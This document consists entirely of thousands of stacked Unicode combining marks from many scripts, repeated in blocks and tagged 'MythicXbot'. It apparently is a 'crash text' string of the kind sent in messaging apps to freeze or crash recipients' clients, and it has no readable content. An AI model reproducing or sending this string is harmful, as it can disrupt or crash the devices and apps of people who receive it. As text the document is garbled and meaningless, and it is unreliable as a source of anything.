҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘